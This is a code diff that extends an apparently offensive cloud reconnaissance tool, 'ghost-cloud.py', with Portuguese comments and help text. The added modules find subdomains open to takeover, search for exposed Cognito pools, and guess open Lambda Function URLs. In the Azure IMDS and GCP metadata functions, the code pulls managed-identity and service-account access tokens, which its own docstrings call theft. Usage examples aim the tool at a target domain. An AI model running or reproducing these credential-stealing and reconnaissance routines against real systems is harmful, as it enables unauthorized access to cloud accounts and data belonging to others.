@@ -817,6 +817,286 @@ def check_sg_permissive(domain: str, region: str = "us-east-1",
     return findings
 
 
+# ─── Subdomain Takeover ───────────────────────────────────────────────────────
+
+_TAKEOVER_SIGNATURES = {
+    "s3.amazonaws.com": "NoSuchBucket",
+    "s3-website": "NoSuchBucket",
+    "blob.core.windows.net": "ResourceNotFound",
+    "azurewebsites.net": "404 Web Site not found",
+    "cloudapp.azure.com": "404 Not Found",
+    "trafficmanager.net": "404 Not Found",
+    "azureedge.net": "404 Not Found",
+    "github.io": "There isn't a GitHub Pages site here",
+    "githubusercontent.com": "404",
+    "shopify.com": "Sorry, this shop is currently unavailable",
+    "fastly.net": "Fastly error: unknown domain",
+    "pantheonsite.io": "404 error unknown site",
+    "heroku": "No such app",
+    "netlify": "Not Found",
+    "surge.sh": "project not found",
+    "ngrok.io": "Tunnel .* not found",
+    "readme.io": "Project doesnt exist",
+    "ghost.io": "The thing you were looking for is no longer here",
+    "bitbucket.io": "Repository not found",
+    "helpjuice.com": "We could not find what you're looking for",
+    "helpscoutdocs.com": "No settings were found for this company",
+    "fly.io": "404",
+}
+
+
+def check_subdomain_takeover(domain: str) -> list:
+    """Detecta subdominios vulneraveis a takeover via CNAME para servicos cloud abandonados."""
+    import socket
+    import re as _re
+    findings = []
+    _log("Takeover", f"Verificando subdomain takeover para {domain}", "C")
+
+    subdomains = [
+        f"www.{domain}", f"mail.{domain}", f"blog.{domain}", f"app.{domain}",
+        f"api.{domain}", f"dev.{domain}", f"staging.{domain}", f"test.{domain}",
+        f"cdn.{domain}", f"static.{domain}", f"assets.{domain}", f"media.{domain}",
+        f"admin.{domain}", f"portal.{domain}", f"help.{domain}", f"docs.{domain}",
+        f"status.{domain}", f"shop.{domain}", f"store.{domain}", f"beta.{domain}",
+    ]
+
+    for sub in subdomains:
+        try:
+            cname_target = None
+            try:
+                # Tentar resolver CNAME
+                result = socket.getaddrinfo(sub, None)
+                # socket nao expoe CNAME diretamente, usar via getfqdn
+                fqdn = socket.getfqdn(sub)
+                if fqdn != sub:
+                    cname_target = fqdn
+            except socket.gaierror:
+                # NXDOMAIN - subdominio nao existe
+                continue
+
+            if not cname_target:
+                continue
+
+            # Verificar se CNAME aponta para servico cloud
+            for svc_pattern, dangling_sig in _TAKEOVER_SIGNATURES.items():
+                if svc_pattern.lower() in cname_target.lower():
+                    # Tentar HTTP para ver se retorna assinatura de "nao encontrado"
+                    for scheme in ["https", "http"]:
+                        try:
+                            url = f"{scheme}://{sub}"
+                            status, _, body = _get(url, timeout=5)
+                            if _re.search(dangling_sig, body, _re.I):
+                                findings.append({
+                                    "subdomain": sub,
+                                    "cname": cname_target,
+                                    "service": svc_pattern,
+                                    "signature": dangling_sig,
+                                    "severity": "critical",
+                                    "note": f"CNAME dangling: {sub} -> {cname_target} ({svc_pattern})"
+                                })
+                                _log("Takeover", f"[CRITICO] {sub} -> {cname_target} ({svc_pattern})", "R")
+                                break
+                        except Exception:
+                            pass
+        except Exception:
+            pass
+
+    _log("Takeover", f"{len(findings)} subdomain(s) vulneravel(is) encontrado(s)", "C")
+    return findings
+
+
+# ─── Azure IMDS ───────────────────────────────────────────────────────────────
+
+def check_azure_imds(ip: str = "169.254.169.254") -> dict:
+    """Verifica Azure IMDS para roubo de identidade gerenciada (Managed Identity)."""
+    result = {"reachable": False, "identity": None, "token": None, "subscription": None}
+    _log("IMDS", f"Verificando Azure IMDS em {ip}", "C")
+
+    # Endpoint de instancia Azure
+    url_instance = f"http://{ip}/metadata/instance?api-version=2021-02-01"
+    status, _, body = _get(url_instance, headers={"Metadata": "true"}, timeout=4)
+    if status == 200 and "subscriptionId" in body:
+        result["reachable"] = True
+        try:
+            import json as _j
+            data = _j.loads(body)
+            comp = data.get("compute", {})
+            result["subscription"] = comp.get("subscriptionId", "")
+            result["resource_group"] = comp.get("resourceGroupName", "")
+            result["vm_name"] = comp.get("name", "")
+            result["location"] = comp.get("location", "")
+            _log("IMDS", f"[AZURE] VM: {result['vm_name']} | Sub: {result['subscription']}", "R")
+        except Exception:
+            result["raw"] = body[:300]
+
+        # Tentar obter token de acesso via Managed Identity
+        url_token = (f"http://{ip}/metadata/identity/oauth2/token"
+                     f"?api-version=2018-02-01&resource=https://management.azure.com/")
+        st2, _, body2 = _get(url_token, headers={"Metadata": "true"}, timeout=4)
+        if st2 == 200 and "access_token" in body2:
+            try:
+                import json as _j
+                tok = _j.loads(body2)
+                result["token"] = tok.get("access_token", "")[:40] + "..."
+                result["token_type"] = tok.get("token_type", "")
+                result["identity"] = "managed-identity"
+                _log("IMDS", "[CRITICO] Token de Managed Identity obtido - acesso a Azure ARM API", "R")
+            except Exception:
+                pass
+
+    return result
+
+
+# ─── GCP Metadata ─────────────────────────────────────────────────────────────
+
+def check_gcp_metadata(ip: str = "169.254.169.254") -> dict:
+    """Verifica GCP Metadata Server para roubo de service account tokens."""
+    result = {"reachable": False, "project": None, "token": None, "service_accounts": []}
+    _log("IMDS", f"Verificando GCP Metadata Server em {ip}", "C")
+
+    base = f"http://{ip}/computeMetadata/v1"
+    hdr = {"Metadata-Flavor": "Google"}
+
+    # Projeto
+    st, _, body = _get(f"{base}/project/project-id", headers=hdr, timeout=4)
+    if st == 200 and body.strip():
+        result["reachable"] = True
+        result["project"] = body.strip()
+        _log("IMDS", f"[GCP] Project: {result['project']}", "R")
+
+        # Service accounts
+        st2, _, body2 = _get(f"{base}/instance/service-accounts/", headers=hdr, timeout=4)
+        if st2 == 200:
+            sas = [s.strip().rstrip("/") for s in body2.splitlines() if s.strip()]
+            result["service_accounts"] = sas
+            for sa in sas:
+                if not sa:
+                    continue
+                st3, _, body3 = _get(f"{base}/instance/service-accounts/{sa}/token",
+                                     headers=hdr, timeout=4)
+                if st3 == 200 and "access_token" in body3:
+                    try:
+                        import json as _j
+                        tok = _j.loads(body3)
+                        result["token"] = tok.get("access_token", "")[:40] + "..."
+                        result["token_sa"] = sa
+                        _log("IMDS", f"[CRITICO] Token GCP SA {sa} obtido", "R")
+                    except Exception:
+                        pass
+                    break
+
+        # Hostname e SSH keys
+        st4, _, body4 = _get(f"{base}/instance/hostname", headers=hdr, timeout=4)
+        if st4 == 200:
+            result["hostname"] = body4.strip()
+
+    # Tentar metadata.google.internal tambem
+    if not result["reachable"]:
+        st5, _, body5 = _get("http://metadata.google.internal/computeMetadata/v1/project/project-id",
+                              headers=hdr, timeout=4)
+        if st5 == 200 and body5.strip():
+            result["reachable"] = True
+            result["project"] = body5.strip()
+            result["via"] = "metadata.google.internal"
+            _log("IMDS", f"[GCP] Project via metadata.google.internal: {body5.strip()}", "R")
+
+    return result
+
+
+# ─── AWS Cognito ──────────────────────────────────────────────────────────────
+
+def check_cognito(domain: str) -> list:
+    """Detecta Identity Pools Cognito com acesso nao autenticado habilitado."""
+    findings = []
+    _log("Cognito", f"Verificando Cognito Identity Pools para {domain}", "C")
+    base = domain.split(".")[0]
+    regions = ["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"]
+
+    for region in regions:
+        # Tentar endpoint publico de Cognito Identity
+        url = f"https://cognito-idp.{region}.amazonaws.com/"
+        st, _, body = _get(url, timeout=4)
+        if st in (400, 403, 200):
+            # Verificar se ha user pools expostos via dominio personalizado
+            for prefix in [base, base.replace("-", ""), f"{base}auth"]:
+                pool_url = f"https://{prefix}.auth.{region}.amazoncognito.com/.well-known/openid-configuration"
+                st2, _, body2 = _get(pool_url, timeout=4)
+                if st2 == 200 and "userinfo_endpoint" in body2:
+                    findings.append({
+                        "url": pool_url, "region": region,
+                        "severity": "high",
+                        "note": f"Cognito User Pool exposto: {prefix}.auth.{region}.amazoncognito.com"
+                    })
+                    _log("Cognito", f"[USER POOL] {prefix}.auth.{region}.amazoncognito.com", "Y")
+
+    # Verificar se ha credenciais Cognito em codigo JS publico
+    for js_path in ["/static/js/main.js", "/app.js", "/bundle.js", "/assets/app.js"]:
+        url = f"https://{domain}{js_path}"
+        st, _, body = _get(url, timeout=5)
+        if st == 200:
+            import re as _re
+            patterns = [
+                _re.compile(r'us-[a-z]+-\d:[0-9a-f\-]{36}', _re.I),  # Identity Pool ID
+                _re.compile(r'IdentityPoolId["\s:]+["\']([^"\']+)["\']', _re.I),
+                _re.compile(r'UserPoolId["\s:]+["\']([^"\']+)["\']', _re.I),
+                _re.compile(r'ClientId["\s:]+["\']([^"\']{20,})["\']', _re.I),
+            ]
+            for pat in patterns:
+                matches = pat.findall(body)
+                if matches:
+                    findings.append({
+                        "url": url, "matches": matches[:3],
+                        "severity": "high",
+                        "note": f"Cognito IDs expostos em JS: {js_path}"
+                    })
+                    _log("Cognito", f"[LEAK] Cognito IDs em {url}: {matches[0]}", "Y")
+                    break
+
+    return findings
+
+
+# ─── Lambda Function URLs ─────────────────────────────────────────────────────
+
+def check_lambda_function_urls(domain: str) -> list:
+    """Detecta Lambda Function URLs sem autenticacao (AuthType=NONE)."""
+    findings = []
+    _log("Lambda", f"Verificando Lambda Function URLs para {domain}", "C")
+    base = domain.split(".")[0]
+
+    # Lambda Function URLs sao no formato: https://<id>.lambda-url.<region>.on.aws/
+    regions = ["us-east-1", "us-east-2", "us-west-2", "eu-west-1", "ap-southeast-1"]
+    for region in regions:
+        # Tentar adivinhar IDs comuns (palavras do dominio)
+        for word in [base, base[:8], f"{base}-api", f"{base}-fn"]:
+            # IDs reais sao hash hexadecimal, mas alguns sao memoraveis
+            # Mais util: verificar se o dominio tem subdominio lambda
+            lambda_domain = f"{word}.lambda-url.{region}.on.aws"
+            url = f"https://{lambda_domain}/"
+            st, hdrs, body = _get(url, timeout=4)
+            if st not in (0, 403) and len(body) > 10:
+                findings.append({
+                    "url": url, "status": st, "body_preview": body[:200],
+                    "severity": "critical" if st == 200 else "medium",
+                    "note": f"Lambda Function URL acessivel: {lambda_domain}"
+                })
+                _log("Lambda", f"[URL] {url} -> HTTP {st}", "Y" if st != 200 else "R")
+
+    # Verificar se o proprio dominio tem endpoints Lambda expostos
+    for path in ["/api", "/webhook", "/function", "/invoke"]:
+        url = f"https://{domain}{path}"
+        st, hdrs, body = _get(url, timeout=4)
+        if st == 200 and any(h.lower() in str(hdrs).lower() for h in
+                             ["x-amzn-requestid", "x-amz-apigw", "x-amzn-trace-id"]):
+            findings.append({
+                "url": url, "status": st,
+                "severity": "medium",
+                "note": f"Endpoint com headers AWS em {url}"
+            })
+            _log("Lambda", f"[AWS ENDPOINT] {url}", "Y")
+
+    return findings
+
+
 # ─── Relatorio ────────────────────────────────────────────────────────────────
 
 def _print_summary(all_findings: dict):
@@ -838,16 +1118,21 @@ def _print_summary(all_findings: dict):
 # ─── Main ─────────────────────────────────────────────────────────────────────
 
 _CLOUD_HELP = """\033[92mModulos por Provider:\033[0m
-  \033[1m--aws\033[0m              AWS: S3 buckets, ECR registries, IMDS metadata
-  \033[1m--azure\033[0m            Azure: Blob storage, ACR, SAS tokens, metadata
+  \033[1m--aws\033[0m              AWS: S3 buckets, ECR registries, CloudFormation
+  \033[1m--azure\033[0m            Azure: Blob storage, ACR, SAS tokens
   \033[1m--gcp\033[0m              GCP: GCS buckets, GCR, service account keys
-  \033[1m--imds\033[0m             IMDS: Roubo de credenciais via metadata endpoint
+  \033[1m--imds\033[0m             IMDS AWS: credenciais via metadata endpoint (IMDSv1)
+  \033[1m--azure-imds\033[0m       IMDS Azure: Managed Identity token (ARM API)
+  \033[1m--gcp-metadata\033[0m     GCP Metadata Server: service account token
   \033[1m--registry\033[0m         Container registries: acesso publico/anonimo
   \033[1m--firebase\033[0m         Firebase: rules abertas, dados publicos
   \033[1m--elasticsearch\033[0m    Elasticsearch: instancias sem auth expostas
   \033[1m--k8s\033[0m              Kubernetes: API server, kubelet, etcd expostos
-  \033[1m--iac\033[0m              IaC leaks: Terraform state, CF templates publicos
-  \033[1m--aws-api\033[0m          AWS API calls com credenciais (IAM enum, S3 list)
+  \033[1m--iac\033[0m              IaC leaks: Terraform state, CF templates, .env
+  \033[1m--takeover\033[0m         Subdomain takeover via CNAME dangling (20+ servicos)
+  \033[1m--cognito\033[0m          AWS Cognito: Identity Pools e User Pools expostos
+  \033[1m--function-urls\033[0m    Lambda Function URLs sem autenticacao
+  \033[1m--aws-api\033[0m          AWS API com credenciais: Lambda env, IAM, CloudTrail, SG
   \033[1m--all\033[0m              Executar todos os modulos
 
 \033[92mOpcoes:\033[0m
@@ -865,10 +1150,13 @@ _CLOUD_HELP = """\033[92mModulos por Provider:\033[0m
 
 \033[92mExemplos:\033[0m
   python ghost-cloud.py -t empresa.com --all
-  python ghost-cloud.py -t empresa.com --aws --s3 --imds
+  python ghost-cloud.py -t empresa.com --aws --imds
   python ghost-cloud.py --bucket minha-empresa-backup --aws
   python ghost-cloud.py -t empresa.com --azure --gcp --firebase
   python ghost-cloud.py --imds --ip 169.254.169.254
+  python ghost-cloud.py --azure-imds --ip 169.254.169.254
+  python ghost-cloud.py --gcp-metadata
+  python ghost-cloud.py -t empresa.com --takeover --cognito
   python ghost-cloud.py -t empresa.com --k8s --elasticsearch
   python ghost-cloud.py --aws-api --aws-key AKIA... --aws-secret ...
 
@@ -902,6 +1190,16 @@ def main():
     ap.add_argument("--k8s", action="store_true",
                     help="Kubernetes API sem autenticacao")
     ap.add_argument("--all", action="store_true", help="Executar todos os modulos")
+    ap.add_argument("--azure-imds", action="store_true",
+                    help="Azure IMDS: Managed Identity token (ARM API)")
+    ap.add_argument("--gcp-metadata", action="store_true",
+                    help="GCP Metadata Server: service account token")
+    ap.add_argument("--takeover", action="store_true",
+                    help="Subdomain takeover via CNAME dangling")
+    ap.add_argument("--cognito", action="store_true",
+                    help="AWS Cognito: Identity Pools e User Pools expostos")
+    ap.add_argument("--function-urls", action="store_true",
+                    help="Lambda Function URLs sem autenticacao")
     ap.add_argument("--aws-api", action="store_true",
                     help="Checks AWS via API boto3 (Lambda, IAM, CloudTrail, EC2 IMDSv1, SG)")
     ap.add_argument("--aws-region", default="us-east-1", metavar="REGION",
@@ -984,6 +1282,26 @@ def main():
         if run_all or getattr(args, "k8s", False):
             _log("K8s", f"Verificando Kubernetes API em {target}", "C")
             all_findings["k8s"] = check_k8s_anon(target)
+
+        if run_all or getattr(args, "takeover", False):
+            _log("Takeover", f"Verificando subdomain takeover para {target}", "C")
+            all_findings["takeover"] = check_subdomain_takeover(target)
+
+        if run_all or getattr(args, "cognito", False):
+            _log("Cognito", f"Verificando Cognito para {target}", "C")
+            all_findings["cognito"] = check_cognito(target)
+
+        if run_all or getattr(args, "function_urls", False):
+            _log("Lambda-URLs", f"Verificando Lambda Function URLs para {target}", "C")
+            all_findings["function_urls"] = check_lambda_function_urls(target)
+
+    if run_all or getattr(args, "azure_imds", False):
+        _log("Azure-IMDS", f"Verificando Azure IMDS em {args.ip}", "C")
+        all_findings["azure_imds"] = [check_azure_imds(args.ip)]
+
+    if run_all or getattr(args, "gcp_metadata", False):
+        _log("GCP-Meta", f"Verificando GCP Metadata em {args.ip}", "C")
+        all_findings["gcp_metadata"] = [check_gcp_metadata(args.ip)]
 
     aws_key = getattr(args, "aws_key", None)
     aws_secret = getattr(args, "aws_secret", None)
